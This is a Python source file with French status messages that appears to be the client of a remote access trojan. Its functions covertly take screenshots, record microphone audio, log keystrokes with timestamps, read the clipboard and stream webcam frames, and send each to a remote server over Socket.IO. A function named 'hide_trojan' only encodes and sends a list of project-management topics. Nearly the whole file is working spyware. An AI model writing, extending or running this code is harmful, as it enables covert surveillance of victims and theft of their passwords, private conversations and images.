import base64
import io
import os
import time
import wave

import cv2
import keyboard
import pyaudio
import pyautogui
import pyperclip
from PIL import Image


def take_and_send_screenshot(sio):
    try:
        screenshot = pyautogui.screenshot()
        screenshot_bytes_io = io.BytesIO()
        screenshot.save(screenshot_bytes_io, format='PNG')
        screenshot_bytes_io.seek(0)
        resized_screenshot = resize_image(screenshot_bytes_io)
        screenshot_encoded = base64.b64encode(resized_screenshot.getvalue()).decode()
        sio.emit('screenshot_response', {'screenshot': screenshot_encoded})
        print("Capture d'écran envoyée")
    except Exception as e:
        print(f"Échec de la capture d'écran: {e}")
        pass


def resize_image(image_bytes_io, base_width=1300):
    img = Image.open(image_bytes_io)
    w_percent = (base_width / float(img.size[0]))
    h_size = int((float(img.size[1]) * float(w_percent)))
    img = img.resize((base_width, h_size), Image.Resampling.LANCZOS)
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    return img_byte_arr


def record_and_send_audio(duration=10, sio=None):
    try:
        audio = pyaudio.PyAudio()
        stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
        for i in range(0, int(44100 / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        audio.terminate()

        audio_bytes = b''.join(frames)
        audio_io = io.BytesIO()
        save_wave_file(audio_io, audio_bytes)

        audio_io.seek(0)
        audio_encoded = base64.b64encode(audio_io.read()).decode()
        sio.emit('audio_response', {'audio': audio_encoded})
        print("Audio envoyé")
    except Exception as e:
        print(f"Échec de l'enregistrement audio: {e}")
        pass


def save_wave_file(file_io, audio_data):
    with wave.open(file_io, 'wb') as wave_file:
        wave_file.setnchannels(1)
        wave_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
        wave_file.setframerate(44100)
        wave_file.writeframes(audio_data)


def record_and_send_keyboard_log(duration=10, sio=None):
    try:
        print("Enregistrement du keylogger en cours...")
        keyboard.start_recording()
        time.sleep(duration)
        keyboard_events = keyboard.stop_recording()
        keyboard_log = [event.name for event in keyboard_events if event.event_type == 'down']
        keyboard_log = [f"{key} - {time.strftime('%d/%m/%Y %H:%M:%S')}" for key in keyboard_log]
        sio.emit('keyboard_response', {'keyboard_log': keyboard_log})
        print("Keylogger envoyé")
    except Exception as e:
        print(f"Échec de l'enregistrement du keylogger: {e}")
        pass


def get_clipboard_content(sio=None):
    try:
        print("Récupération du presse-papiers...")
        clipboard_content = pyperclip.paste()
        if clipboard_content and sio:
            sio.emit('clipboard_response', {'clipboard_content': clipboard_content})
            print("Contenu du presse-papiers envoyé au serveur via Socket.IO.")
        else:
            print("Aucun contenu trouvé dans le presse-papiers ou connexion au serveur Socket.IO manquante.")
    except Exception as e:
        print(f"Échec de la récupération du presse-papiers: {e}")


def gen_frames(sio):
    try:
        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Using DirectShow
        if not camera.isOpened():
            raise ValueError("Failed to open webcam")

        while True:
            success, frame = camera.read()
            if not success:
                print("Failed to read frame from webcam")
                break
            else:
                ret, buffer = cv2.imencode('.jpg', frame)
                if not ret:
                    print("Failed to encode frame")
                    continue
                frame_bytes = base64.b64encode(buffer)
                sio.emit('webcam_response', {'data': frame_bytes.decode()})

    except Exception as e:
        print(f"Failed to initialize or read from webcam: {e}")
    finally:
        if 'camera' in locals() and camera.isOpened():
            camera.release()
        cv2.destroyAllWindows()


def hide_trojan(sio):
    try:
        print("Dissimuler le trojan dans un fichier .exe ...")
        trojan_message = """Comment travailler efficacement en équipe?
La gestion du temps
Bien comprendre le besoin client
Les différentes étapes d’un projet
La notion de WBS
Le diagramme de PERT et la notion de chemin critique
Diagramme de Gantt et Trello
La communication pendant le projet. Construire un RACI
Le suivi de projet"""
        encoded_trojan = base64.b64encode(trojan_message.encode()).decode()
        sio.emit('trojan_response', {'trojan': encoded_trojan})
        print("Trojan dissimulé")
    except Exception as e:
        print(f"Échec de la dissimulation du trojan: {e}")
